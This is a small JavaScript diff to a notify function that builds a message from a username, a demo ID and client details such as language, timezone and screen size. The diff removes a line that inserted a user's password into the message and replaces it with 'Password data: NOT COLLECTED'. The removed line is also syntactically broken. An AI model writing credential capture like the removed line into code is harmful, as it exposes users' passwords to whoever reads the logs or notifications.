@@ -23,7 +23,7 @@ async function notify({username,demoId,timestamp,clientInfo}){
     "🌐 Language: "+safeText(clientInfo.language),
     "🕓 Timezone: "+safeText(clientInfo.timezone),
     "📱 Viewport: "+safeText(clientInfo.screenWidth)+" × "+safeText(clientInfo.screenHeight),
-    ""🔐 Password data: " + password,
+    "🔐 Password data: NOT COLLECTED"
   ].join("\n");
 
   console.log("\n"+text+"\n");
